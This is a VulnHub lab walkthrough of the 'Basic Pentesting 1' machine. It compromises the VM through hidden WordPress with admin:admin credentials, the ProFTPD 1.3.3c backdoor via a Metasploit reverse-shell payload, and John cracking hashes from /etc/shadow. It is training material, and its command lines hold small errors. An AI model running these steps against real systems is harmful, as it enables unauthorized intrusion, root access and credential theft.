Basic Pentesting 1 VulnHub Walkthrough
Introduction
This write-up covers the exploitation of the Basic Pentesting: 1 machine from VulnHub. The goal was to assess how easily the system could be compromised using common penetration testing techniques.
Result: Full system compromise was achieved through an exposed WordPress installation with weak credentials and an outdated ProFTPD service containing a known backdoor.

Vulnerability 1: Improper Virtual Host Configuration & Weak WordPress Credentials

Description: The web server exposes a hidden WordPress installation due to a misconfigured virtual host, and the WordPress admin account uses default weak credentials (admin:admin), allowing attackers to gain full administrative access.

Exploitation POC:
Step 1. Identify the web server
- Run an ARP scan to find the target machine's IP
sudo arp-scan
<img width="652" height="518" alt="2 arpscan netdiscover to find ip" src="https://github.com/user-attachments/assets/9a7e191f-6d82-4d8e-8cf1-72fd476b0553" />

Scan the IP using nmap

nmap -sC -SV -Pn 192.168.64.2
Visit http://192.168.64.2 - Apache default page "It works!" appears

Step 2. Discover the Hidden WordPress Directory
Perform directory enumeration using gobuster

gobuster dir -u http://192.168.64.2/ -w /usr/share/wordlists/dirbuster/di
rectory-list-2.3-medium.txt
Gobuster reveals the path (/secret); a broken Wordpress

interface loads when visited
Step 3. Identify Virtual Host Misconfiguration and fixing the mapping
Inspect the page and links, they point to: http://vtcsec/secret
The domain vtcsec does not resolve, causing the UI to break.

Add the domain manually to /etc/hosts

Full WordPress UI loads correctly when refreshed.

Step 4. Enumerate WordPress Users
Run WPScan to enumerate users

wpscan -url http://192.168.64.2/secret/ --enumerate u
INSERT WPSCAN 2
WPScan identifies username: admin

Step 5. Exploit Weak Credentials
Go to the Wordpress login page
Attempt default credentials (admin:admin)

Login succeeds, granting full administrative control and access to the wp dashboard.

Vulnerability 2: ProFTPD 1.3.3c Backdoor Remote Command Execution
Description: The FTP service is running ProFTPD 1.3.3c, a version containing a known backdoor that allows unauthenticated remote command execution as the root user.
Exploitation POC:
Step 1. Identify the Vulnerable FTP Service
The nmap scan results shows an ftp service ProFTPD 1.3.3c - This version is publicly known to contain a backdoor inserted in its source code.
Step 2. Search for Public Exploits
Check available exploits using Searchsploit

searchsploit proftpo 1.3.3c
Results show an exploit for ProFTPD 1.3.3c Backdoor Command Execution, including a Metasploit module.

Step 3. Load the Exploit in Metasploit
Start Metasploit (msfconsole)

Load the exploit module

use exploit/unix/ftp/proftpd_133c_backdoor
Set the target IP

set RHOST 192.168.64.2
Choose payloads

show payloads
set PAYLOAD cmd/unix/reverse
Setup options and exploit

set LHOST 192.168.64.4
Exploit awayyy!

Step 4. Gain Root Command Shell
Metasploit returns:

Command shell session opened
This shell provides direct command execution as root.
Step 5. Verify root privileges
Run the following to check the user and id:

whoami       // returns root
check id.    // output: uid=0(root)

Vulnerability 3: Weak Password Policy allowing privileged account compromise
Description: The system stores user password hashes in /etc/shadow, and once an attacker gains initial root-level access, the hash for user marlinspike can be extracted and cracked using John the Ripper. The cracked password allows the attacker to log in via SSH, gaining persistent authenticated access.
Exploitation POC:
Step 1. Start with Root Access from Vulnerability 2
Get an interactive python shell using the bash command "shell"

Step 2.Locate Password Hashes
Display the /etc/shadow file

cat /etc/shadow
Identify the target user entry
Copy the full hash string

Step 3.Use John the Ripper to crack the password
Create a file to store the hash
Run John the Ripper against the extracted hash john pass.txt

John begins dictionary/wordlist attacks and eventually outputs the cracked password.

Step 4.Verify the Password
Attempt SSH login with the cracked credentials

ssh marlinspike@192.168.64.2
When prompted, enter the cracked password

Step 5. Confirm Authenticated Access
Once logged in, verify user identity

whoami   // output: root
Login to the vm using the cracked password to verify login.

Using the credentials obtained, we can ssh into the machine as well to carry out further tasks.
